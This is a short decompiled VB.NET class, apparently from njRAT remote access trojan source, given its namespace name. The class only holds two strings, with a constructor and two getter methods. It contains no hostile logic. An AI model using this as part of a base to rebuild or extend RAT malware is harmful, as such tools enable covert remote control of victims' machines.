﻿Imports System

Namespace NJRAT
	' Token: 0x02000031 RID: 49
	Public NotInheritable Class GClass4
		' Token: 0x060005AE RID: 1454 RVA: 0x00145630 File Offset: 0x00143A30
		Public Sub New(string_2 As String, string_3 As String)
			Me.string_0 = string_2
			Me.string_1 = string_3
		End Sub

		' Token: 0x060005AF RID: 1455 RVA: 0x0014564C File Offset: 0x00143A4C
		Public Function method_0() As String
			Return Me.string_0
		End Function

		' Token: 0x060005B0 RID: 1456 RVA: 0x00145664 File Offset: 0x00143A64
		Public Function method_1() As String
			Return Me.string_1
		End Function

		' Token: 0x040002F8 RID: 760
		Private string_0 As String

		' Token: 0x040002F9 RID: 761
		Private string_1 As String
	End Class
End Namespace
